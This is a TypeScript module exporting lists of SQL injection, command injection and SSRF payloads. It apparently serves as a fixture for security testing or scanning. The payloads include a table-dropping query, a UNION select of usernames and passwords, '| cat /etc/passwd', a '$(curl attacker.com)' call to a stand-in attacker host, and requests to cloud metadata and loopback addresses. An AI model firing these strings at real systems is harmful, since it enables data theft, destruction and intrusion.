export const SQLI_PAYLOADS = [
  "' OR '1'='1",
  "1; DROP TABLE users--",
  "1' UNION SELECT null,username,password FROM users--",
  "admin'--",
  "' OR 1=1 LIMIT 1--",
] as const;

export const CMDI_PAYLOADS = [
  "; ls -la",
  "| cat /etc/passwd",
  "&& whoami",
  "`id`",
  "$(curl attacker.com)",
] as const;

export const SSRF_PAYLOADS = [
  "http://169.254.169.254/latest/meta-data/",
  "http://localhost:6379",
  "file:///etc/passwd",
  "//169.254.169.254/",
  "http://0177.0.0.1/",
  "http://0x7f.0.0.1",
  "http://[::1]",
  "http://127.1",
] as const;
